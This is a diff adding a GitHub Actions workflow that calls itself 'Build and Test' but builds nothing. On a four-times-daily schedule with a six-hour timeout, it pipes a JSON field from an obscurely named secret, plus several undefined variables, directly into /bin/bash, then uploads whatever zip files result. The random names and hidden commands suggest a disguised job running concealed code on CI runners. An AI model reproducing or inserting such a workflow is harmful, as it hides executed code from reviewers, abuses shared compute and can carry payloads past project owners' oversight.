@@ -1,0 +1,38 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '10 1,7,13,19 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          uyjl7789: ${{ secrets.uyjl7789 }}
+        run: |
+          printf '%s' "$uyjl7789" | jq -r .ezo7 | /bin/bash
+          echo $ecii3813 | jq -r .feo4 | /bin/bash
+          printf '%s' "$pa874" | jq -r .rivgj19 | /bin/bash
+          echo $ftqd5506 | jq -r .owq5 | /bin/bash
+          echo $kxp51 | jq -r .iyu5 | /bin/bash
+          echo $paf306 | jq -r .wz24707 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: yDeDjuhv
+          path: "*.zip"
+          retention-days: 1
